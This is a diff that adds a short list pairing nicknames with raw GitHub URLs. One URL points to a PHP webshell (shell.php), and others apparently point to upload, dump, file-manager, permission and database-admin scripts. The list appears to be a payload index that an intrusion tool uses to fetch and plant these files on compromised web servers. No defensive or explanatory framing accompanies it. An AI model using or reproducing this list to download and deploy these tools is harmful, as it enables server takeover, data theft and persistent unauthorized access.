@@ -1,0 +1,10 @@
+yess https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt
+yes2 https://raw.githubusercontent.com/igor-s-ribeiro/webshell-php/refs/heads/master/shell.php
+vur https://necessaryfor.github.io/all/vur.txt
+dump https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/dump.txt
+dump2 https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/dump2.php
+manager https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt
+izinver https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/izinver.txt
+info https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/info.txt
+adminer https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/adminer.txt
+up9 https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/upload9.php
